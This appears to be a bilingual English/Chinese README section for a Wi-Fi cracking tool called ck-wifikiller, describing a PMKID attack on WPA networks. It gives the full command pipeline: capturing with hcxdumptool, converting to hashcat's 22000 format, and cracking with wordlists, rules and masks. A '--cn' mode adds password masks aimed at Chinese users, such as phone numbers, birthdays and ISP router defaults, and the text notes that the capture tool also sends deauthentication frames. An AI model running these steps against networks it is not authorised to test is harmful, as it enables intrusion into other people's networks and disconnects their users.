### PMKID Attack / PMKID 攻击

See https://hashcat.net/forum/thread-7717.html

> 2026 现代流程: `hcxdumptool` → pcapng → `hcxpcapngtool` → `WPA*01*...` (hc22000) → `hashcat -m 22000`

### Steps / 步骤

1. Start `hcxdumptool` (daemon) / 启动 `hcxdumptool`
   * `sudo hcxdumptool -i wlan1mon -o pmkid.pcapng -t 10 --enable_status=1`
   * 现代版使用 BPF 过滤: `--bpf=` (由 `--bpfc` 或 `tcpdump -ddd` 生成)
2. Detect when PMKID is found. / 检测 PMKID
   * `hcxpcapngtool -o pmkid.22000 pmkid.pcapng`
   * 单行 `WPA*01*PMKID*MACAP*...*ESSID(hex)` 即 hc22000 格式。
3. Save `.hc22000` file to `./hs/` / 保存到 `./hs/`
   * 结果类型: `CrackResultPMKID`，写入 `cracked.txt`
4. Run crack attack using hashcat / 用 hashcat 爆破:
   * `hashcat -m 22000 -a0 pmkid.hc22000 wordlist.txt`
   * ck-wifikiller 增强: `--rules` / `--mask` / `--increment` / `--cn` 智能掩码管线

### Problems / 已知问题

* 需要 hashcat 支持 `-m 22000`（现代版均支持，旧 16800 已废弃）。
* 部分 AP 需客户端探测流量触发 PMKID；可尝试关联/失败连接。
* 无线网卡兼容性差异；hcxdumptool 会附带 deauth 与握手采集。

### CN Optimization / 国内优化

`--cn` 启用后，字典阶段失败自动追加国内常用掩码:
8 位纯数字 → 11 位手机号 → 生日组合 → 运营商光猫规律。


